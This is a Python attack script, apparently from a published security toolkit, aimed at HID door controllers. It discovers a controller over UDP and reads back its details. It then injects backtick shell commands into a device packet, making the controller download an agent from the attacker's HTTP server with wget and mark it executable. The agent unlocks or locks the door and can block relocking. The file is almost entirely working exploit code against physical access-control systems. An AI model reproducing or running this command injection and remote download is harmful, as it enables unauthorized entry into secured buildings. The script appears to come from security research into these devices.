#!/usr/bin/env python
# By Mike Kelly
# exfil.co
# @lixmk
#
# This script is part of the Concierge Toolkit
# https://github.com/lixmk/Concierge
#
###########################################################################
#                                                                         #
# This program is free software: you can redistribute it and/or modify    #
# it under the terms of the GNU General Public License as published by    #
# the Free Software Foundation, either version 3 of the License, or       #
# at your option) any later version.                                      #
#                                                                         #
# This program is distributed in the hope that it will be useful,         #
# but WITHOUT ANY WARRANTY; without even the implied warranty of          #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           #
# GNU General Public License for more details.                            #
#                                                                         #
# You should have received a copy of the GNU General Public License       #
# along with this program.  If not, see <http://www.gnu.org/licenses/>.   #
#                                                                         #
###########################################################################

import socket
import argparse
import SimpleHTTPServer
import SocketServer
import threading
from time import sleep
from os import remove

# Generating agent script. A readable version of this agent is at ./tools/agent
def genagent():
  with open("a","w+") as f:
    f.write('#!/bin/sh\nEXPECTED_ARGS=1;\nif [ $# -ne $EXPECTED_ARGS ]\nthen\n  exit 1\nfi\nif [ $1 = unlock ]\nthen\n  export QUERY_STRING="?ID=0&BoardType=V100&Description=Strike&Relay=1&Action=1"\n  /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\n  #Uncomment to reventing others from relocking via diagnostics_execute.cgi\n  #chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\nfi\nif [ $1 = lock ]\nthen\n  #If you uncommented the previous chmod, uncomment this one\n  #chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\n  export QUERY_STRING="?ID=0&BoardType=V100&Description=Strike&Relay=1&Action=0"\n  /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\nfi\nif [ $1 = blink ]\nthen\ni="0"\n  while [ $i -lt 10 ]\n  do\n    export QUERY_STRING="?ID=0&BoardType=V100&Description=LED_GREEN&Relay=1&Action=1"\n    /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\n    export QUERY_STRING="?ID=0&BoardType=V100&Description=LED_GREEN&Relay=1&Action=0"\n    /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\n    export QUERY_STRING="?ID=0&BoardType=V100&Description=LED_BLUE&Relay=1&Action=1"\n    /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\n    export QUERY_STRING="?ID=0&BoardType=V100&Description=LED_BLUE&Relay=1&Action=0"\n    /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\n    i=`expr $i + 1`\n  done\nfi\n')


def deploy(rhost, rport):
  SocketServer.TCPServer.allow_reuse_address = True
  # Convert IP address to hex to save space
  ipbits = lhost.split('.')
  abcd = (int(ipbits[0])*256**3) + (int(ipbits[1])*256**2) + (int(ipbits[2])*256) + int(ipbits[3])
  local = hex(abcd).rstrip('L')
  # Send Discovery Packet: Pulling Mac
  s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
  pkt0 = "discover;013;"
  print "[*] Sending Discovery Packet..."
  s.sendto(pkt0, (rhost, rport))
  rspn = s.recv(1024)
  rmac = rspn.split(";")[2]
  print ""
  print "[+] Response: "+rspn.split(";")[0]
  print "[+] Device Type: "+rspn.split(";")[6]
  print "[+] Hostname: "+rspn.split(";")[3]
  print "[+] Internal IP: "+rspn.split(";")[4]
  print "[+] MAC Address: "+rspn.split(";")[2]
  print "[+] Firmware Version: "+rspn.split(";")[7]
  print "[+] Build Date: "+rspn.split(";")[8]
  print ""
  # Starting SimpleHTTPServer in separate thread and sending command injections
  pkt1 = "command_blink_on;044;"+rmac+";1`wget -O/tmp/a http://"+local+":"+str(lport)+"/a`;"
  pkt2 = "command_blink_on;044;"+rmac+";1`chmod +x /tmp/a`;"
  httpd = SocketServer.TCPServer(("", lport), SimpleHTTPServer.SimpleHTTPRequestHandler)
  th = threading.Thread(target=httpd.serve_forever)
  th.daemon = True
  th.start()
  print "[*] Deploying agent..."
  print "[*] Injecting wget command to pull from: http://"+lhost+":"+str(lport)
  s.sendto(pkt1, (rhost, rport))
  sleep(1)
  print "[*] Making agent executable."
  s.sendto(pkt2, (rhost, rport))
  sleep(0.5)
  print "[*] Agent Deployed. Use triggeragent.py to issue commands."

if __name__ == '__main__':
  parser = argparse.ArgumentParser(usage='./agentdeploy.py -r 10.0.0.1 -l 192.168.1.1')
  parser.add_argument('-r', '--rhost', required=True, help='IP of target door controller')
  parser.add_argument('-l', '--lhost', required=True, help='Local Host IP')
  parser.add_argument('-p', '--lport', type=int, default="8080", help='Local port to host script (default: %(default)s)')
  args = parser.parse_args()
  rhost = args.rhost
  rport = 4070
  lport = args.lport
  lhost = args.lhost
  
  print "################################"
  print "# Conceirge HID Agent Deployer #"
  print "################################"
  print ""
  print "[*] Targeting HID Controller at: "+rhost
  genagent()
  deploy(rhost,rport)
  remove("a")
